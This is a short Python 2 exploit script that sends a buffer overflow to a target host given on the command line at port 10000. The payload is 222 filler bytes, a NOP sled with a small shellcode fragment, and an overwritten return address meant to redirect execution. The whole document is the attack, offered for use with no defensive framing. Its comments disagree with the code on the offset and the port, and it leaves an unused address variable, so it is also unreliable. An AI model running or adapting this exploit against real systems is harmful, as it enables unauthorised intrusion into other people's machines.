#!/usr/bin/env python
# written by opt1@eigrp.co
import sys
from socket import *

#Target's IP Port:4444
# NOP = 14 Bytes + 11 Bytes + 4 = 29Bytes
xbuf = """
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x33\xd2\x52\x52\x52\x52\xe8\xbe\xe9\x44\x7d\x90\x90\x90
"""

s = socket(AF_INET, SOCK_STREAM)

s.connect((sys.argv[1], 10000))

#268 Until EIP
buf = "A"*222 # offset to EIP
#EIP is backwards... 00 41 90 FC
#lands on NOP SLED @ 00 22 FC A3
#->Shellcode Payload

EIP2 = "\xA3\xFC\x22\x00"
EIP = "\x22\xFC\x90\x41"
s.send(buf+xbuf+EIP2)

print s.recv(1024)

s.close()
